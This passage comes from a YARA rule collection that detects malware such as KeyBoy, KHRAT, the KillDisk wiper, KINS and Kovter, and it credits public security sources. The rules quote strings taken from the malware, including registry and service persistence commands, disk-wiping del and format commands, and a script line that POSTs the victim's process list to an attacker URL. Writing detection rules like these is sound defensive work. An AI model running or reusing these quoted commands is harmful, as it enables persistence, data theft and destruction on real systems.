$3 = \"$shell$\"\n        $4 = \"$fileManager$\"\n        $5 = \"$fileDownload$\"\n        $6 = \"$fileUpload$\"\n\n    condition:\n        all of them\n}\n\nrule new_keyboy_export\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"new_keyboy_export\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and pe.exports(\"cfsUpdate\")\n}\n\nrule new_keyboy_header_codes\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"new_keyboy_header_codes\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $s1 = \"*l*\" wide fullword\n        $s2 = \"*a*\" wide fullword\n        $s3 = \"*s*\" wide fullword\n        $s4 = \"*d*\" wide fullword\n        $s5 = \"*f*\" wide fullword\n        $s6 = \"*g*\" wide fullword\n        $s7 = \"*h*\" wide fullword\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and all of them\n}\n\nrule keyboy_commands\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"keyboy_commands\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $s1 = \"Update\" wide fullword\n        $s2 = \"UpdateAndRun\" wide fullword\n        $s3 = \"Refresh\" wide fullword\n        $s4 = \"OnLine\" wide fullword\n        $s5 = \"Disconnect\" wide fullword\n        $s6 = \"Pw_Error\" wide fullword\n        $s7 = \"Pw_OK\" wide fullword\n        $s8 = \"Sysinfo\" wide fullword\n        $s9 = \"Download\" wide fullword\n        $s10 = \"UploadFileOk\" wide fullword\n        $s11 = \"RemoteRun\" wide fullword\n        $s12 = \"FileManager\" wide fullword\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and 6 of them\n}\n\nrule keyboy_errors\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"keyboy_errors\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $error = \"Error2\" ascii wide\n        $s1 = \"Can't find [%s]!Check the file name and try again!\" ascii wide\n        $s2 = \"Open [%s] error! %d\" ascii wide\n        $s3 = \"The Size of [%s] is zero!\" ascii wide\n        $s4 = \"CreateThread DownloadFile[%s] Error!\" ascii wide\n        $s5 = \"UploadFile [%s] Error:Connect Server Failed!\" ascii wide\n        $s6 = \"Receive [%s] Error(Recved[%d] != Send[%d])!\" ascii wide\n        $s7 = \"Receive [%s] ok! Use %2.2f seconds, Average speed %2.2f k/s\" ascii wide\n        $s8 = \"CreateThread UploadFile[%s] Error!\" ascii wide\n        $s9 = \"Ready Download [%s] ok!\" ascii wide\n        $s10 = \"Get ControlInfo from FileClient error!\" ascii wide\n        $s11 = \"FileClient has a error!\" ascii wide\n        $s12 = \"VirtualAlloc SendBuff Error(%d)\" ascii wide\n        $s13 = \"ReadFile [%s] Error(%d)...\" ascii wide\n        $s14 = \"ReadFile [%s] Data[Readed(%d) != FileSize(%d)] Error...\" ascii wide\n        $s15 = \"CreateThread DownloadFile[%s] Error!\" ascii wide\n        $s16 = \"RecvData MyRecv_Info Size Error!\" ascii wide\n        $s17 = \"RecvData MyRecv_Info Tag Error!\" ascii wide\n        $s18 = \"SendData szControlInfo_1 Error!\" ascii wide\n        $s19 = \"SendData szControlInfo_3 Error!\" ascii wide\n        $s20 = \"VirtualAlloc RecvBuff Error(%d)\" ascii wide\n        $s21 = \"RecvData Error!\" ascii wide\n        $s22 = \"WriteFile [%s} Error(%d)...\" ascii wide\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and $error and 3 of ($s*)\n}\n\nrule keyboy_systeminfo\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"keyboy_systeminfo\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $s1 = \"SystemVersion:    %s\" ascii wide\n        $s2 = \"Product  ID:      %s\" ascii wide\n        $s3 = \"InstallPath:      %s\" ascii wide\n        $s4 = \"InstallTime:      %d-%d-%d, %02d:%02d:%02d\" ascii wide\n        $s5 = \"ResgisterGroup:   %s\" ascii wide\n        $s6 = \"RegisterUser:     %s\" ascii wide\n        $s7 = \"ComputerName:     %s\" ascii wide\n        $s8 = \"WindowsDirectory: %s\" ascii wide\n        $s9 = \"System Directory: %s\" ascii wide\n        $s10 = \"Number of Processors:       %d\" ascii wide\n        $s11 = \"CPU[%d]:  %s: %sMHz\" ascii wide\n        $s12 = \"RAM:         %dMB Total, %dMB Free.\" ascii wide\n        $s13 = \"DisplayMode: %d x %d, %dHz, %dbit\" ascii wide\n        $s14 = \"Uptime:      %d Days %02u:%02u:%02u\" ascii wide\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and 7 of them\n}\n\nrule keyboy_related_exports\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"keyboy_related_exports\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and pe.exports(\"Embedding\") or pe.exports(\"SSSS\") or pe.exports(\"GetUP\")\n}\n\nrule keyboy_init_config_section\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"keyboy_init_config_section\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 300KB and for any i in (0 .. pe.number_of_sections - 1) : (pe.sections[i].name == \".Init\" and pe.sections[i].virtual_size % 1024 == 0)\n}\n\nrule KeyBoys_malware_1\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        ref = \"http://www.pwc.co.uk/issues/cyber-security-data-privacy/research/the-keyboys-are-back-in-town.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KeyBoys_malware_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"reg add HKLM\\\\%s\\\\Parameters /v ServiceDll /t REG_EXPAND_SZ /d \\\"%s\\\" /f\" fullword ascii\n        $x3 = \"Internet using \\\\svchost.exe -k  -n 3\" fullword ascii\n        $x4 = \"reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" /v SFCDisable /t REG_DWORD /d 4 /f\" fullword ascii\n        $s1 = \"sc create %s binpath= \\\"%s\\\" Type= share Start= auto DisplayName= \\\"%s\\\"\" fullword ascii\n        $s2 = \"ExecCmd:%s\" fullword ascii\n        $s3 = \"szCommand : %s\" fullword ascii\n        $s4 = \"Current user is a member of the %s\\\\%s group\" fullword ascii\n        $s5 = \"icacls %s /grant administrators:F\" fullword ascii\n        $s6 = \"Ping 127.0.0.1 goto Repeat\" fullword ascii\n        $s7 = \"Start MoveFile %s -> %s\" fullword ascii\n        $s8 = \"move %s\\\\dllcache%s %s\\\\dllcache\\\\%s\" fullword ascii\n        $s9 = \"%s\\\\cmd.exe /c \\\"%s\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and (pe.imphash() == \"68f7eced34c46808756db4b0c45fb589\" or (pe.exports(\"Insys\") and pe.exports(\"Inuser\") and pe.exports(\"SSSS\")) or 1 of ($x*) or 4 of them)\n}\n\nrule KeyBoy_InstallClient\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        ref = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Markus Neis, Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KeyBoy_InstallClient\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"egsvr32.exe \\\"/u bitsadmin /canceft\\\\windows\\\\currebitsadmin\" ascii\n        $x2 = \"/addfibitsadmin /Resumbitsadmin /SetNosoftware\\\\microsotifyCmdLine \" ascii\n        $x3 = \"D:\\\\Work\\\\Project\\\\VS\\\\house\\\\Apple\\\\\" ascii\n        $x4 = \"Bj+I11T6z9HFMG5Z5FMT/u62z9zw8FyWV0xrcK7HcYXkiqnAy5tc/iJuKtwM8CT3sFNuQu8xDZQGSR6D8/Bc/Dpuz8gMJFz+IrYqNAzwuPIitg==\" fullword ascii\n        $x5 = \"szCmd1:%s\" fullword ascii\n        $s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n        $s4 = \"rundll32.exe %s Main\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and (1 of ($x*) or 2 of them)\n}\n\nrule KeyBoy_wab32res\n{\n    meta:\n        description = \"KeyBoy backdoor loader\"\n        ref = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Markus Neis, Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KeyBoy_wab32res\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"B4490-2314-55C1- /Processid:{321bitsadmin /canceft\\\\windows\\\\curresoftware\\\\microso\" fullword ascii\n        $x2 = \"D:\\\\Work\\\\VS\\\\House\\\\TSSL\\\\TSSL\\\\TClient\" ascii\n        $x3 = \"\\\\Release\\\\FakeRun.pdb\" ascii\n        $x4 = \"FakeRun.dll\" fullword ascii\n        $s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n        $s2 = \"CreateProcess failed (%d)\" fullword ascii\n        $s3 = \"CreateProcess %s \" fullword ascii\n        $s4 = \"FindResource %s error \" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (1 of ($x*) or 4 of them)\n}\n\nrule KeyBoy_rasauto\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        ref = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Markus Neis, Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KeyBoy_rasauto\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"rundll32.exe %s SSSS & exit\" fullword ascii\n        $x2 = \"D:\\\\Work\\\\Project\\\\VS\\\\HSSL\\\\HSSL_Unicode _2\\\\Release\\\\ServiceClient.pdb\" fullword ascii\n        $s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n        $s2 = \"CreateProcess failed (%d)\" fullword ascii\n        $s3 = \"ServiceClient.dll\" fullword ascii\n        $s4 = \"NtWow64QueryInformationProcess64 failed\" fullword ascii\n        $s5 = \"pid:%d CmdLine:%S\" fullword ascii\n        $s6 = \"rasauto32.ServiceMain\" fullword ascii\n        $s7 = \"del /q/f %s\\\\%s*\" fullword ascii\n        $s8 = \"szTmpDll:%s\" fullword ascii\n        $s9 = \"lpCmdLine:%s\" fullword ascii\n        $s0 = \"ReleaseFileFromRes:%s ok!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (pe.exports(\"SSSS\") or 1 of ($x*) or 4 of them)\n}\n\nrule KeyBoy_876_0x4e20000\n{\n    meta:\n        description = \"KeyBoy backdoor\"\n        ref = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n        classifications = \"Backdoor\"\n        threat_names = \"KeyBoy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Markus Neis, Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KeyBoy_876_0x4e20000\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"%s\\\\rundll32.exe %s ServiceTake %s %s\" fullword ascii\n        $x2 = \"#%sCmd shell is not running,or your cmd is error!\" fullword ascii\n        $x3 = \"Take Screen Error,May no user login!\" fullword ascii\n        $x4 = \"Get logon user fail!\" fullword ascii\n        $x5 = \"8. LoginPasswd:%s\" fullword ascii\n        $x6 = \"Take Screen Error,service dll not exists\" fullword ascii\n        $s1 = \"taskkill /f /pid %s\" fullword ascii\n        $s2 = \"TClient.exe\" fullword ascii\n        $s3 = \"%s\\\\wab32res.dll\" fullword ascii\n        $s4 = \"%s\\\\rasauto.dll\" fullword ascii\n        $s5 = \"Download file:%s index:%d\" fullword ascii\n        $s6 = \"LogonUser: [%s]\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and (1 of ($x*) or 3 of them)\n}\n\nrule keydnap_downloader\n{\n    meta:\n        description = \"OSX/Keydnap credential stealer\"\n        ref = \"http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-is-hungry-for-credentials\"\n        classifications = \"Downloader, Spyware\"\n        threat_names = \"Keydnap\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Marc-Etienne M.L\u00e9veill\u00e9\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"keydnap_downloader\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $ = \"icloudsyncd\"\n        $ = \"killall Terminal\"\n        $ = \"open %s\"\n\n    condition:\n        2 of them\n}\n\nrule keydnap_backdoor_packer\n{\n    meta:\n        description = \"OSX/Keydnap credential stealer\"\n        ref = \"http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-is-hungry-for-credentials\"\n        classifications = \"Spyware\"\n        threat_names = \"Keydnap\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Marc-Etienne M.L\u00e9veill\u00e9\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"keydnap_backdoor_packer\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $upx_string = \"This file is packed with the UPX\"\n        $packer_magic = \"ASS7\"\n        $upx_magic = \"UPX!\"\n\n    condition:\n        $upx_string and $packer_magic and not $upx_magic\n}\n\nrule keydnap_backdoor\n{\n    meta:\n        description = \"OSX/Keydnap credential stealer\"\n        ref = \"http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-is-hungry-for-credentials\"\n        classifications = \"Spyware\"\n        threat_names = \"Keydnap\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Marc-Etienne M.L\u00e9veill\u00e9\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"keydnap_backdoor\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $ = \"api/osx/get_task\"\n        $ = \"api/osx/cmd_executed\"\n        $ = \"Loader-\"\n        $ = \"u2RLhh+!LGd9p8!ZtuKcN\"\n        $ = \"com.apple.iCloud.sync.daemon\"\n\n    condition:\n        2 of them\n}\n\nrule KHRAT_Malware\n{\n    meta:\n        description = \"KHRAT trojan\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"KHRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KHRAT_Malware\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and pe.imphash() == \"6a8478ad861f98f8428a042f74de1944\"\n}\n\nrule KHRAT_script\n{\n    meta:\n        description = \"KHRAT trojan\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"KHRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_KHRAT_script\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"CreateObject(\\\"WScript.Shell\\\").Run \\\"schtasks /create /sc MINUTE /tn\" ascii\n        $x2 = \"CreateObject(\\\"WScript.Shell\\\").Run \\\"rundll32.exe javascript:\\\"\\\"\\\\..\\\\mshtml,RunHTMLApplication\" ascii\n        $x3 = \"<registration progid=\\\"ff010f\\\" classid=\\\"{e934870c-b429-4d0d-acf1-eef338b92c4b}\\\" >\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule KHRAT_scritplet\n{\n    meta:\n        description = \"KHRAT trojan\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"KHRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_KHRAT_scritplet\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"http.open \\\"POST\\\", \\\"http://update.upload-dropbox[.]com/docs/tz/GetProcess.php\\\",False,\\\"\\\",\\\"\\\" \" fullword ascii\n        $x2 = \"Process=Process & Chr(32) & Chr(32) & Chr(32) & Obj.Description\" fullword ascii\n        $s1 = \"http.SetRequestHeader \\\"Content-Type\\\", \\\"application/json\\\" \" fullword ascii\n        $s2 = \"Dim http,WMI,Objs,Process\" fullword ascii\n        $s3 = \"Set Objs=WMI.InstancesOf(\\\"Win32_Process\\\")\" fullword ascii\n        $s4 = \"'WScript.Echo http.responseText \" fullword ascii\n\n    condition:\n        uint16(0) == 0x3f3c and filesize < 1KB and (1 of ($x*) or 4 of them)\n}\n\nrule BlackEnergy_KillDisk_1\n{\n    meta:\n        description = \"KillDisk wiper\"\n        ref = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n        classifications = \"Wiper\"\n        threat_names = \"KillDisk\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"BlackEnergy_KillDisk_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"system32\\\\cmd.exe\" fullword ascii\n        $s1 = \"system32\\\\icacls.exe\" fullword wide\n        $s2 = \"/c del /F /S /Q %c:\\\\*.*\" fullword ascii\n        $s3 = \"shutdown /r /t %d\" fullword ascii\n        $s4 = \"/C /Q /grant \" fullword wide\n        $s5 = \"%08X.tmp\" fullword ascii\n        $s6 = \"/c format %c: /Y /X /FS:NTFS\" fullword ascii\n        $s7 = \"/c format %c: /Y /Q\" fullword ascii\n        $s8 = \"taskhost.exe\" fullword wide\n        $s9 = \"shutdown.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and 8 of them\n}\n\nrule BlackEnergy_KillDisk_2\n{\n    meta:\n        description = \"KillDisk wiper\"\n        ref = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n        classifications = \"Wiper\"\n        threat_names = \"KillDisk\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"BlackEnergy_KillDisk_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"%c:\\\\~tmp%08X.tmp\" fullword ascii\n        $s1 = \"%s%08X.tmp\" fullword ascii\n        $s2 = \".exe.sys.drv.doc.docx.xls.xlsx.mdb.ppt.pptx.xml.jpg.jpeg.ini.inf.ttf\" fullword wide\n        $s3 = \"%ls_%ls_%ls_%d.~tmp\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and 3 of them\n}\n\nrule KINS_dropper\n{\n    meta:\n        description = \"KINS trojan dropper\"\n        ref = \"http://goo.gl/arPhm3\"\n        classifications = \"Trojan\"\n        threat_names = \"KINS\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"AlienVault Labs aortega@alienvault.com\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KINS_dropper\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $n1 = \"tid=%d&ta=%s-%x\" fullword\n        $n2 = \"fid=%d\" fullword\n        $n3 = \"%[^.].%[^(](%[^)])\" fullword\n        $i0 = \"%s [%s %d] 77 %s\"\n        $i01 = \"Global\\\\%s%x\"\n        $i1 = \"Inject::InjectProcessByName()\"\n        $i2 = \"Inject::CopyImageToProcess()\"\n        $i3 = \"Inject::InjectProcess()\"\n        $i4 = \"Inject::InjectImageToProcess()\"\n        $i5 = \"Drop::InjectStartThread()\"\n        $uac1 = \"ExploitMS10_092\"\n        $uac2 = \"\\\\globalroot\\\\systemroot\\\\system32\\\\tasks\\\\\" ascii wide\n        $uac3 = \"<RunLevel>HighestAvailable</RunLevel>\" ascii wide\n\n    condition:\n        2 of ($n*) and 2 of ($i*) and 2 of ($uac*)\n}\n\nrule KINS_DLL_zeus\n{\n    meta:\n        description = \"KINS trojan\"\n        ref = \"http://goo.gl/arPhm3\"\n        classifications = \"Trojan\"\n        threat_names = \"KINS\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"AlienVault Labs aortega@alienvault.com\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KINS_DLL_zeus\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $n1 = \"%BOTID%\" fullword\n        $n2 = \"%opensocks%\" fullword\n        $n3 = \"%openvnc%\" fullword\n        $n4 = /Global\\\\(s|v)_ev/ fullword\n        $s1 = \"\\x72\\x6E\\x6D\\x2C\\x36\\x7D\\x76\\x77\"\n        $s2 = \"\\x18\\x04\\x0F\\x12\\x16\\x0A\\x1E\\x08\\x5B\\x11\\x0F\\x13\"\n        $s3 = \"\\x39\\x1F\\x01\\x07\\x15\\x19\\x1A\\x33\\x19\\x0D\\x1F\"\n        $s4 = \"\\x62\\x6F\\x71\\x78\\x63\\x61\\x7F\\x69\\x2D\\x67\\x79\\x65\"\n        $s5 = \"\\x6F\\x69\\x7F\\x6B\\x61\\x53\\x6A\\x7C\\x73\\x6F\\x71\"\n\n    condition:\n        all of ($n*) and 1 of ($s*)\n}\n\nrule Kovter\n{\n    meta:\n        description = \"Kovter fileless malware\"\n        ref = \"http://blog.airbuscybersecurity.com/post/2016/03/FILELESS-MALWARE-%E2%80%93-A-BEHAVIOURAL-ANALYSIS-OF-KOVTER-PERSISTENCE\"\n        classifications = \"Trojan\"\n        threat_names = \"Kovter\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Kovter\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $type = \"Microsoft-Windows-Security-Auditing\" wide ascii\n        $eventid = \"4688\" wide ascii\n        $data = \"Windows\\\\System32\\\\regsvr32.exe\" wide ascii\n        $type1 = \"Microsoft-Windows-Security-Auditing\" wide ascii\n        $eventid1 = \"4689\" wide ascii\n        $data1 = \"Windows\\\\System32\\\\mshta.exe\" wide ascii\n        $type2 = \"Microsoft-Windows-Security-Auditing\" wide ascii\n        $eventid2 = \"4689\" wide ascii\n        $data2 = \"Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" wide ascii\n        $type3 = \"Microsoft-Windows-Security-Auditing\" wide ascii\n        $eventid3 = \"4689\" wide ascii\n        $data3 = \"Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\" wide ascii\n\n    condition:\n        all of them\n}\n\nrule Kraken_Bot_Sample\n{\n    meta:\n        description = \"Kraken bot\"\n        ref = \"https://blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html\"\n        classifications = \"Bot\"\n        threat_names = \"Kraken\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Kraken_Bot_Sample\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"%s=?getname\" fullword ascii\n        $s4 = \"&COMPUTER=^\" fullword ascii\n        $s5 = \"xJWFwcGRhdGElAA=\" fullword ascii\n        $s8 = \"JVdJTkRJUi\" fullword ascii\n        $s20 = \"btcplug\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\nrule Kriskynote_Mar17_1\n{\n    meta:\n        description = \"Kriskynote backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"Kriskynote\"\n        vti_default_score = 5\n        